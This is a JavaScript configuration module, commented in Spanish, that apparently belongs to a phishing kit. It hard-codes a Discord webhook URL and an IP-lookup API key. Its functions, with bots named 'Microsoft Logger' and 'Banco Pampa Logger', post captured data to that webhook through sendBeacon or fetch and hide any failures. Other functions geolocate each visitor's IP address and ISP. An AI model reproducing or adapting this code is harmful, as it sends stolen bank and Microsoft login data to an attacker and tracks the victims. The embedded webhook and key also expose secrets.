// Módulo centralizado de configuración Discord
// Webhook URL y funciones compartidas para todos los discord-*.js

const DiscordConfig = (function () {
  'use strict';

  const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1524092182800236665/Hb2GJHNtl9rH7B3jmHcYkTrOtu59wXWBkohwh_8wTvy8_G8uPtgfYZkU0nE_CaVuFTcz';
  const IPDATA_API_KEY = 'c3c534b646d39a871a47f795fc4302e1227acc8bf07b4d550efbff15';

  function sendEmbed(embed) {
    if (!WEBHOOK_URL || WEBHOOK_URL.includes('TU_WEBHOOK')) {
      console.warn('Discord webhook no configurado');
      return Promise.resolve({ success: false });
    }

    var payload = {
      username: 'Microsoft Logger',
      avatar_url: 'https://cdn-icons-png.flaticon.com/512/732/732221.png',
      embeds: [embed]
    };

    var blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
    var sent = navigator.sendBeacon(WEBHOOK_URL, blob);

    if (sent) {
      return Promise.resolve({ success: true });
    }

    return fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      mode: 'no-cors',
      keepalive: true
    }).then(function () { return { success: true }; }).catch(function () { return { success: true }; });
  }

  function sendWebhook(content, embeds) {
    if (!WEBHOOK_URL || WEBHOOK_URL.includes('TU_WEBHOOK')) {
      console.warn('Discord Webhook URL not configured');
      return Promise.resolve({ success: false, error: 'Not configured' });
    }

    var payload = {
      content: content,
      username: 'Banco Pampa Logger',
      avatar_url: 'https://cdn-icons-png.flaticon.com/512/10095/10095449.png'
    };

    if (embeds) {
      payload.embeds = embeds;
    }

    console.log('Discord: Sending webhook...');

    return fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      mode: 'no-cors',
      keepalive: true
    })
      .then(function () { return { success: true }; })
      .catch(function () {
        try {
          var blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
          navigator.sendBeacon(WEBHOOK_URL, blob);
        } catch (e) { }
        return { success: true };
      });
  }

  function getCountryFlag(countryCode) {
    var flags = {
      'AR': '🇦🇷', 'BO': '🇧🇴', 'BR': '🇧🇷', 'CL': '🇨🇱', 'CO': '🇨🇴', 'CR': '🇨🇷',
      'CU': '🇨🇺', 'DO': '🇩🇴', 'EC': '🇪🇨', 'SV': '🇸🇻', 'GT': '🇬🇹', 'HN': '🇭🇳',
      'MX': '🇲🇽', 'NI': '🇳🇮', 'PA': '🇵🇦', 'PY': '🇵🇾', 'PE': '🇵🇪', 'PR': '🇵🇷',
      'UY': '🇺🇾', 'VE': '🇻🇪', 'US': '🇺🇸', 'CA': '🇨🇦', 'ES': '🇪🇸', 'AD': '🇦🇩',
      'AL': '🇦🇱', 'AT': '🇦🇹', 'BY': '🇧🇾', 'BE': '🇧🇪', 'BA': '🇧🇦', 'BG': '🇧🇬',
      'HR': '🇭🇷', 'CY': '🇨🇾', 'CZ': '🇨🇿', 'DK': '🇩🇰', 'EE': '🇪🇪', 'FI': '🇫🇮',
      'FR': '🇫🇷', 'DE': '🇩🇪', 'GR': '🇬🇷', 'HU': '🇭🇺', 'IS': '🇮🇸', 'IE': '🇮🇪',
      'IT': '🇮🇹', 'LV': '🇱🇻', 'LI': '🇱🇮', 'LT': '🇱🇹', 'LU': '🇱🇺', 'MT': '🇲🇹',
      'MD': '🇲🇩', 'MC': '🇲🇨', 'ME': '🇲🇪', 'NL': '🇳🇱', 'MK': '🇲🇰', 'NO': '🇳🇴',
      'PL': '🇵🇱', 'PT': '🇵🇹', 'RO': '🇷🇴', 'RU': '🇷🇺', 'SM': '🇸🇲', 'RS': '🇷🇸',
      'SK': '🇸🇰', 'SI': '🇸🇮', 'SE': '🇸🇪', 'CH': '🇨🇭', 'TR': '🇹🇷', 'UA': '🇺🇦',
      'GB': '🇬🇧', 'VA': '🇻🇦', 'AU': '🇦🇺', 'NZ': '🇳🇿', 'FJ': '🇫🇯', 'PF': '🇵🇫',
      'CN': '🇨🇳', 'HK': '🇭🇰', 'JP': '🇯🇵', 'KR': '🇰🇷', 'TW': '🇹🇼', 'SG': '🇸🇬',
      'TH': '🇹🇭', 'VN': '🇻🇳', 'ID': '🇮🇩', 'MY': '🇲🇾', 'PH': '🇵🇭', 'IN': '🇮🇳',
      'BD': '🇧🇩', 'LK': '🇱🇰', 'MM': '🇲🇲', 'NP': '🇳🇵', 'PK': '🇵🇰', 'AF': '🇦🇫',
      'IR': '🇮🇷', 'IQ': '🇮🇶', 'IL': '🇮🇱', 'JO': '🇯🇴', 'KZ': '🇰🇿', 'KG': '🇰🇬',
      'UZ': '🇺🇿', 'TM': '🇹🇲', 'AE': '🇦🇪', 'SA': '🇸🇦', 'YE': '🇾🇪', 'OM': '🇴🇲',
      'QA': '🇶🇦', 'BH': '🇧🇭', 'KW': '🇰🇼', 'EG': '🇪🇬', 'LY': '🇱🇾', 'TN': '🇹🇳',
      'DZ': '🇩🇿', 'MA': '🇲🇦', 'SD': '🇸🇩', 'ET': '🇪🇹', 'KE': '🇰🇪', 'TZ': '🇹🇿',
      'UG': '🇺🇬', 'RW': '🇷🇼', 'BI': '🇧🇮', 'DJ': '🇩🇯', 'SO': '🇸🇴', 'ER': '🇪🇷',
      'SS': '🇸🇸', 'TD': '🇹🇩', 'CF': '🇨🇫', 'CM': '🇨🇲', 'GA': '🇬🇦', 'GQ': '🇬🇶',
      'ST': '🇸🇹', 'AO': '🇦🇴', 'CD': '🇨🇩', 'CG': '🇨🇬', 'ZR': '🇿🇷', 'NA': '🇳🇦',
      'BW': '🇧🇼', 'SZ': '🇸🇿', 'LS': '🇱🇸', 'MW': '🇲🇼', 'ZM': '🇿🇲', 'ZW': '🇿🇼',
      'MU': '🇲🇺', 'MG': '🇲🇬', 'RE': '🇷🇪', 'SC': '🇸🇨', 'KM': '🇰🇲', 'CV': '🇨🇻',
      'GW': '🇬🇼', 'GN': '🇬🇳', 'SL': '🇸🇱', 'LR': '🇱🇷', 'CI': '🇨🇮', 'GH': '🇬🇭',
      'TG': '🇹🇬', 'BJ': '🇧🇯', 'NE': '🇳🇪', 'BF': '🇧🇫', 'ML': '🇲🇱', 'SN': '🇸🇳',
      'GM': '🇬🇲', 'MR': '🇲🇷'
    };
    return flags[countryCode.toUpperCase()] || '🌐';
  }

  // getIpInfo con ipdata.co + fallback ip-api.com (usado por discord-index*.js)
  function getIpInfo() {
    var fallbackIpApi = function () {
      return fetch('https://ip-api.com/json/')
        .then(function (response) { return response.json(); })
        .then(function (data) {
          if (data.status === 'success') {
            return {
              ip: data.query || 'Desconocida',
              location: (data.city || '') + ', ' + (data.regionName || '') + ', ' + (data.country || '') || 'Ubicación no disponible',
              country: data.country || '??',
              country_code: data.countryCode || '??',
              isp: data.isp || 'N/A',
              flag: data.countryCode ? getCountryFlag(data.countryCode) : '🌐'
            };
          }
          throw new Error('Error de ip-api.com');
        })
        .catch(function (err) {
          console.error('Error obteniendo información del fallback ip-api.com:', err);
          return {
            ip: 'Desconocida',
            location: 'Ubicación no disponible',
            country: '??',
            country_code: '??',
            isp: 'N/A',
            flag: '❓'
          };
        });
    };

    if (IPDATA_API_KEY && IPDATA_API_KEY !== 'TU_API_KEY_DE_IPDATA_AQUI') {
      return fetch('https://api.ipdata.co?api-key=' + IPDATA_API_KEY)
        .then(function (response) {
          if (!response.ok) throw new Error('Error ipdata.co');
          return response.json();
        })
        .then(function (data) {
          if (data.ip && data.country_name) {
            var locStr = data.city ? data.city + ', ' + (data.region || '') + ', ' + data.country_name : data.country_name;
            return {
              ip: data.ip || 'Desconocida',
              location: locStr || 'Ubicación no disponible',
              country: data.country_name || '??',
              country_code: data.country_code || '??',
              isp: data.org || (data.asn && data.asn.name) || 'N/A',
              flag: data.country_code ? getCountryFlag(data.country_code) : '🌐'
            };
          }
          throw new Error('Datos incompletos de ipdata.co');
        })
        .catch(function (error) {
          console.warn('Fallo ipdata.co, intentando fallback con ip-api.com:', error.message);
          return fallbackIpApi();
        });
    } else {
      console.warn('Falta API Key de ipdata.co, usando fallback con ip-api.com');
      return fallbackIpApi();
    }
  }

  // getIpInfoAlt con ipwho.is + fallback ipify (usado por discord.js)
  function getIpInfoAlt() {
    return fetch('https://ipwho.is/')
      .then(function (res) { return res.json(); })
      .then(function (data) {
        if (!data.success) throw new Error('ipwho.is failed');
        return {
          ip: data.ip,
          location: (data.city || '') + ', ' + (data.region || '') + ', ' + (data.country || ''),
          country: data.country_code || '??',
          isp: (data.connection && data.connection.isp) || 'Desconocido',
          flag: (data.flag && data.flag.emoji) || '🌐'
        };
      })
      .catch(function (err) {
        console.warn('IP Info: ipwho.is failed, trying ipify...', err);
        return fetch('https://api.ipify.org?format=json')
          .then(function (res) { return res.json(); })
          .then(function (data) {
            return {
              ip: data.ip,
              location: 'Ubicación no disponible (Fallback)',
              country: '??',
              isp: 'Desconocido',
              flag: '❓'
            };
          });
      })
      .catch(function (err) {
        console.error('IP Info: All providers failed', err);
        return {
          ip: 'Desconocida',
          location: 'Ubicacion desconocida',
          country: null,
          isp: 'N/A',
          flag: '❓'
        };
      });
  }

  return {
    WEBHOOK_URL: WEBHOOK_URL,
    sendEmbed: sendEmbed,
    sendWebhook: sendWebhook,
    getCountryFlag: getCountryFlag,
    getIpInfo: getIpInfo,
    getIpInfoAlt: getIpInfoAlt
  };
})();
